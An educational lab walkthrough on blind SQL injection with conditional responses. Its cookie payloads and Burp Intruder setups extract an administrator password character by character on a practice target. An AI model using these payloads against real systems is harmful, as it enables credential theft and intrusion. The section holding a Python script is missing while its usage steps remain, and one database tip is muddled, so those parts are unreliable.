
# SQL Injection — Lab #11: Blind SQL Injection with Conditional Responses

**YouTube Tutorial:** [Rana Khalil — Lab #11 Blind SQL injection with conditional responses](https://youtu.be/LBG_n9fr8sM)

---

## 1. What is Blind SQL Injection?

### Core Concept

In standard SQL injection, the web application returns the results of the database query directly on the webpage (or displays raw database error messages when a query fails).

**Blind SQL Injection** occurs when an application is vulnerable to SQL injection, but its HTTP responses **do not return the results of the SQL query or any database errors**.

Because the attacker cannot directly read data from the screen, they must "blindly" ask the database a series of **True or False (boolean) questions**:

- **If the condition is True:** The application behaves in a specific observable way (e.g., displaying a "Welcome back" message, loading a page successfully, or returning a specific HTTP 200 code).
- **If the condition is False:** The application behaves differently (e.g., omitting the "Welcome back" message, showing an error, or returning a different response length).

By sending hundreds or thousands of boolean queries and observing how the application responds, an attacker can extract sensitive database content character-by-character.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

- **Vulnerable Parameter:** The `TrackingId` cookie sent with HTTP requests to the application.
- **Blind SQL Injection Mechanism:** The application executes a SQL query containing the `TrackingId` cookie value. It suppresses error messages and does not print query results directly to the page.
- **Conditional Response Behavior:** The application checks if the SQL query returns any rows:
  - **True Condition:** Displays a **"Welcome back"** message on the page.
  - **False Condition:** Omits the **"Welcome back"** message.

### Root Cause & Impact

- **Root Cause:** Unsanitized user input inside cookie values concatenated directly into a backend SQL query without parameterization.
- **Goal:** Deduce and extract the 20-character password of the `administrator` user using boolean logic, then log into the target application.

---

## 3. FULL Step-by-Step Walkthrough (Rana Khalil's Method)

---

### STEP 1: Set Up Burp Suite & Intercept the Request

1. Open **Burp Suite** and turn on **Proxy → Intercept**.
2. Open your Firefox (with FoxyProxy set to Burp) and visit the lab URL.
3. Burp will intercept the request. Look for the `Cookie` header containing `TrackingId=SomeRandomValue` and `session=SomeSessionValue`.
4. Right-click anywhere on the request → **Send to Repeater** (or press `Ctrl+R`).
5. Turn off Intercept (click **Intercept is on** to toggle it off).
6. In Repeater, click **Send** to see the normal response. Search for `Welcome back` — it should appear (because the original TrackingId exists in the database).

---

### STEP 2: Confirm Blind SQL Injection (True vs False Test)

**What's happening in the backend:**
```sql
SELECT trackingId FROM tracking-table WHERE trackingId = 'ORIGINAL_COOKIE_VALUE'
```

#### Test TRUE condition:

Append a single quote `'` to close the original string, then `AND 1=1` (always true), then `--` to comment out the rest of the query.

Set the cookie to:
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND 1=1--
```

Or using the syntax from Rana's walkthrough:
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND '1'='1
```

**Click Send.** In the response, search for `Welcome back` — it **appears** `✓`

**WHY:** The backend query becomes:
```sql
SELECT trackingId FROM tracking-table WHERE trackingId = 'ORIGINAL_VALUE' AND '1'='1'
```
Since `'1'='1'` is always TRUE, the query returns a row → "Welcome back" is displayed.

#### Test FALSE condition:

Change the payload to `AND 1=0` (always false):
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND 1=0--
```

Or:
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND '1'='2
```

**Click Send.** Search for `Welcome back` — it **does NOT appear** `✗`

**WHY:** The backend query becomes:
```sql
SELECT trackingId FROM tracking-table WHERE trackingId = 'ORIGINAL_VALUE' AND '1'='2'
```
Since `'1'='2'` is always FALSE, the query returns no rows → "Welcome back" is **not** displayed.

**RESULT:** Blind SQL injection is confirmed — we have a working boolean oracle!

---

### STEP 3: Confirm the `users` Table Exists

Now we need to verify there's a `users` table in the database.

**Payload:**
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND (SELECT 'x' FROM users LIMIT 1)='x
```

**Click Send.** Check for `Welcome back`.

**WHY:**
```sql
SELECT trackingId FROM tracking-table WHERE trackingId = 'ORIGINAL_VALUE' AND (SELECT 'x' FROM users LIMIT 1)='x'
```
The subquery `(SELECT 'x' FROM users LIMIT 1)` returns `'x'` if the `users` table exists. Then we check if `'x' = 'x'` — which is TRUE. So "Welcome back" appears.

**RESULT:** `users` table exists `✓`

---

### STEP 4: Confirm the `administrator` User Exists

**Payload:**
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND (SELECT username FROM users WHERE username='administrator')='administrator'--'
```

**Click Send.** Check for `Welcome back`.

**WHY:**
```sql
SELECT trackingId FROM tracking-table WHERE trackingId = 'ORIGINAL_VALUE' AND (SELECT username FROM users WHERE username='administrator')='administrator'--'
```
The subquery returns `'administrator'` if that username exists in the `users` table. Then we check if `'administrator' = 'administrator'` — TRUE.

**RESULT:** `administrator` user exists `✓`

---

### STEP 5: Determine the Password Length

We need to find out how long the administrator's password is.

**Payload format:**
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1)='administrator'--'
```

The number `1` is the value we'll iterate.

#### Method A — Manual via Burp Intruder (Sniper Attack)

1. Send the request with `LENGTH(password) > 1` to **Intruder** (right-click → Send to Intruder).
2. Go to the **Positions** tab. Click **Clear §**.
3. Highlight the number `1` in `LENGTH(password) > 1` and click **Add §**.
4. Set **Attack type:** Sniper.
5. Go to **Payloads** tab:
   - **Payload type:** Numbers
   - **From:** `1`
   - **To:** `50`
   - **Step:** `1`
6. Go to **Settings** → **Grep - Match** — add `Welcome back`.
7. Click **Start Attack**.

**Interpreting results:**
- For `LENGTH(password) > 1` → `Welcome back` = YES (password is longer than 1)
- For `LENGTH(password) > 2` → YES
- ...continues YES until...
- For `LENGTH(password) > 20` → NO `Welcome back` (password is NOT longer than 20)

**RESULT:** Password length = **20 characters** (because `> 19` was true but `> 20` was false).

#### Method B — Manual in Repeater (Faster for checking)

Just manually change the number in Repeater:
```sql
... AND LENGTH(password) > 19)='administrator
```
→ `Welcome back` ✓

```sql
... AND LENGTH(password) > 20)='administrator
```
→ No `Welcome back` ✗

---

### STEP 6: Extract Password Character-by-Character (Burp Intruder Cluster Bomb)

Now for the main event — we extract each of the 20 characters one at a time.

**Payload format:**
```http
Cookie: TrackingId=ORIGINAL_VALUE' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--'
```

There are **two variables** here:
- **Position 1:** The character index (1 through 20) — highlighted as `§1§`
- **Position 2:** The character we're guessing (`a` through `z` and `0` through `9`) — highlighted as `§a§`

#### Setting up Cluster Bomb:

1. Send the request to **Intruder**.
2. **Positions tab:**
   - Click **Clear §**.
   - Set the cookie value to:
     ```
     TrackingId=ORIGINAL_VALUE' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
     ```
   - **Attack type:** Cluster Bomb

3. **Payloads tab → Payload set 1 (Position index):**
   - **Payload type:** Numbers
   - **From:** `1`
   - **To:** `20`
   - **Step:** `1`

4. **Payloads tab → Payload set 2 (Character set):**
   - **Payload type:** Brute Forcer
   - **Character set:** `abcdefghijklmnopqrstuvwxyz0123456789`
   - **Min length:** `1`
   - **Max length:** `1`

5. **Settings tab → Grep - Match:**
   - Add `Welcome back`

6. Click **Start Attack**.

#### Reading the Results:

- The attack will send 20 × 36 = **720 requests** total.
- Sort by the **Welcome back** column (click the column header).
- Rows with a checkmark `✓` in "Welcome back" mean the character at that position was guessed correctly.
- Example:
  - Position 1, character `5` → Welcome back ✓ → First char = `5`
  - Position 2, character `2` → Welcome back ✓ → Second char = `2`
  - Position 3, character `r` → Welcome back ✓ → Third char = `r`
  - ...and so on for all 20 positions.

---

### STEP 7: Alternative — Extract One Position at a Time (Sniper, Simpler)

If Cluster Bomb feels complex, you can do **one position at a time** using Sniper:

1. For position 1:
   ```
   TrackingId=ORIGINAL_VALUE' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
   ```
   - Attack type: **Sniper**
   - Payload: Brute Forcer (`a-z`, `0-9`)
   - Run the attack — only one row will have `Welcome back` ✓
   - Note the character

2. Then change to position 2:
   ```
   TrackingId=ORIGINAL_VALUE' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
   ```
   - Run again, note the character

3. Repeat for positions 3 through 20.

This takes 20 separate attacks but is easier to read.

---

### STEP 8: Log In as Administrator

1. Once you have all 20 characters, go to the lab's login page ("My account").
2. Enter:
   - **Username:** `administrator`
   - **Password:** (the 20-character string you extracted)
3. Click **Log in**.

**If the lab is solved**, you'll see a banner saying **"Congratulations, you solved the lab!"**

---

**To use:**
1. Replace `YOUR_TRACKING_ID_HERE` and `YOUR_SESSION_ID_HERE` with actual values from your Burp request.
2. Save as `sqli-lab-11.py`.
3. Run: `python3 sqli-lab-11.py https://LAB-ID.web-security-academy.net/`
4. The password will appear character-by-character on the same line.

> **Note:** The proxy routes through Burp (`127.0.0.1:8080`) so you can still see requests in Burp. If you don't want that, remove the `proxies` parameter.

---

## 5. Pro-Tips & Common Pitfalls

| Issue | Solution |
|-------|----------|
| **URL Encoding** | Always URL-encode your payloads. In Burp Repeater, select the payload and press `Ctrl+U`. |
| **Burp Community throttling** | Use Python script instead of Intruder for 100x speed. |
| **SQL comment syntax** | `--` works for Oracle/PostgreSQL/MySQL. For Microsoft SQL Server, use `--` with a space. |
| **Character index starts at 1** | `SUBSTRING(password,1,1)` = first character, NOT index 0. |
| **Welcome back not appearing** | Make sure you're using the correct original TrackingId + session from a fresh lab session. |
| **Database differences** | This lab uses PostgreSQL. For Oracle, use `SUBSTR()` instead of `SUBSTRING()`. For MySQL, both work. |
| **Response length filter** | In Intruder results, sort by "Length" column — responses with "Welcome back" will be slightly longer. |

---